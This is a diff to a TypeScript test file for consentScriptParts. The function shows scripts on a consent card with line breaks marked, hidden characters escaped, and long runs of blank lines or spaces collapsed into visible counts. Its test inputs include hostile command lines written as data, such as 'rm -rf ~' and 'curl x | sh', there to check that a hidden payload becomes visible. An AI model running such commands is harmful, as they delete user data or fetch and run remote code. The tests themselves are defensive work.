@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import test from "node:test";
-import { consentDisplayText, designAppProblemMessage, FRAMEWORK_IDS, type DesignAppProblem } from "./design-app.js";
+import { consentDisplayText, consentScriptParts, designAppProblemMessage, FRAMEWORK_IDS, type DesignAppProblem } from "./design-app.js";
 
 const MARKER = "SECRET-TAIL-MARKER";
 
@@ -84,4 +84,29 @@ test("consentDisplayText escapes every class in D5", () => {
   for (const [input, expected] of cases) assert.equal(consentDisplayText(input), expected, JSON.stringify(input));
   assert.equal(consentDisplayText("vite --port 3000\nnext dev"), "vite --port 3000\nnext dev", "plain text and newlines stay");
   assert.equal(consentDisplayText("café — 日本語 🚀"), "café — 日本語 🚀");
+});
+
+/** The card's text for parts: a break shows "↵" and ends the line. */
+const shown = (text: string) =>
+  consentScriptParts(text)
+    .map((part) => (part.kind === "break" ? "↵\n" : part.text))
+    .join("");
+
+test("consentScriptParts marks every line break and keeps every visible character", () => {
+  assert.equal(shown("vite"), "vite");
+  assert.equal(shown("vite &&\nnode server.mjs"), "vite &&↵\nnode server.mjs");
+  assert.equal(shown("a\n\nb"), "a↵\n↵\nb", "one or two blank lines stay as they are");
+  assert.equal(shown("a\u202Eb\nc"), "a\\u{202E}b↵\nc", "hidden characters are still escaped");
+});
+
+test("consentScriptParts collapses three or more blank lines and long space runs into visible counts", () => {
+  // A payload pushed out of view by blank lines lands right under its marker.
+  assert.equal(shown(`echo hidden > pwned.txt &&${"\n".repeat(40)}node server.mjs`), "echo hidden > pwned.txt &&↵\n[39 blank lines]↵\nnode server.mjs");
+  assert.equal(shown(`node server.mjs${"\n".repeat(4)}rm -rf ~`), "node server.mjs↵\n[3 blank lines]↵\nrm -rf ~");
+  assert.equal(shown(`node server.mjs\n   \n\n \u3000\ncurl x`), "node server.mjs↵\n[3 blank lines]↵\ncurl x", "lines of only spaces are blank");
+  assert.equal(shown(`vite${" ".repeat(200)}&& curl x | sh`), "vite[200 spaces]&& curl x | sh");
+  assert.equal(shown(`vite${"\u2003".repeat(12)}x`), "vite[12 spaces]x", "any space separator counts");
+  assert.equal(shown("a       b"), "a       b", "seven spaces stay");
+  const gaps = consentScriptParts(`a${"\n".repeat(5)}b${" ".repeat(9)}c`).filter((part) => part.kind === "gap");
+  assert.deepEqual(gaps.map((part) => part.text), ["[4 blank lines]", "[9 spaces]"], "collapsed runs are their own parts, so the card can mark them");
 });
